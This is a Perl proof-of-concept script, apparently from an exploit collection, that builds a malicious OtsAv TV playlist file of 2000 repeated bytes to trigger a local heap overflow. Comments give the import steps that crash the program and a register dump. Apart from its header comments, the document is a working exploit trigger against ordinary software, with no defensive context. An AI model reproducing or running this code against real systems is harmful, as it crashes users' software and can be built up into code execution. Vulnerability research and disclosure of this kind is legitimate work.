#!/usr/bin/perl
# OtsAv TV [.olf] Local Heap Overflow Poc
# Down : http://www.otsav.com/buy/tv/
# Desc : 2000 A' Heap overflow
# By Mountassif Moad a.k.a Stack
# v4 Team & evil finger
# Open Stack.ofl >> File >>  Import List   >> As playlist  >>
# BOOOOOOOOOOOOOOOOOOOM
# EAX 45454545
# ECX 00009AF0
# EDX 03A0F730
# EBX 0000042A
# ESP 03A0F9C8
# EBP 00000000
# ESI 02CD7102
# EDI 03A0FEAA
# EIP 0043C8D7 OtsAVTVt.0043C8D7
use strict;
use warnings;
my $A= "\x45" x 2000;
open(my $ofl_playlist, "> stack.ofl");
print $ofl_playlist
                    $A.
                    "\r\n";
close $ofl_playlist;
